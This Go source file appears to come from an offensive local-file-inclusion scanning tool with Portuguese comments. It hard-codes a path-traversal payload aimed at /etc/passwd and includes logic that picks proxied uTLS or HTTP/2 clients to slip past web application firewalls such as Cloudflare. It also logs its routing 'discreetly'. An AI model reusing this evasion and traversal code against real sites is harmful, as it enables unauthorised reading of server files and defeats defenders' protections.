// strategies/stealthrouter.go
package strategies // Alterado para 'strategies' para corresponder à importação na main.go

import (
	"errors"
	"net/http"
	"os"
	"strings"
	"time"

	"lfitessla/config"
	"lfitessla/entropy"
	"lfitessla/http2mux"
	"lfitessla/proxy"
	"lfitessla/utlsmux"
)

// CrawlerIA retorna caminhos simulados descobertos por IA.
// Pode futuramente integrar crawl real ou análise DOM.
func CrawlerIA(baseURL string) []string {
	// Exemplo simples de stub que pode ser expandido
	return []string{
		"/index.php?page=home",
		"/?file=README",
		"/../../../../etc/passwd",
	}
}

// EscolherTransport decide dinamicamente o client HTTP com base em heurísticas furtivas.
// - Se WAF for Cloudflare ou RandFloat() > 0.7 → usa uTLS (evasão máxima).
// - Caso contrário → usa HTTP/2 multiplexing.
func EscolherTransport(proxyAddr string, wafDetectado string) (*proxy.Proxy, *http.Client, error) {
	proxySel := proxy.SelecionarProxy()

	// 🔍 Heurística furtiva baseada em detecção de WAF + aleatoriedade
	usarUTLS := strings.Contains(strings.ToLower(wafDetectado), "cloudflare") || entropy.RandFloat() > 0.7

	var (
		client *http.Client
		err    error
	)

	if usarUTLS {
		client, err = utlsmux.ClientHTTP2ComUTLS(proxySel.Address)
		if err != nil {
			return nil, nil, errors.New("falha ao criar cliente com uTLS: " + err.Error())
		}
		if config.LogStealthRouter {
			logTransportEscolhido(proxySel.Address, "uTLS")
		}
	} else {
		client, err = http2mux.ClientHTTP2ComProxy(proxySel.Address)
		if err != nil {
			return nil, nil, errors.New("falha ao criar cliente com HTTP/2: " + err.Error())
		}
		if config.LogStealthRouter {
			logTransportEscolhido(proxySel.Address, "HTTP2")
		}
	}

	return proxySel, client, nil
}

// logTransportEscolhido registra discretamente o tipo de client usado e o proxy.
func logTransportEscolhido(proxyAddr string, metodo string) {
	f, err := os.OpenFile("stealth_router.log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		return
	}
	defer f.Close()

	logEntry := time.Now().Format("2006-01-02 15:04:05") + " → [" + metodo + "] via " + proxyAddr + "\n"
	f.WriteString(logEntry)
}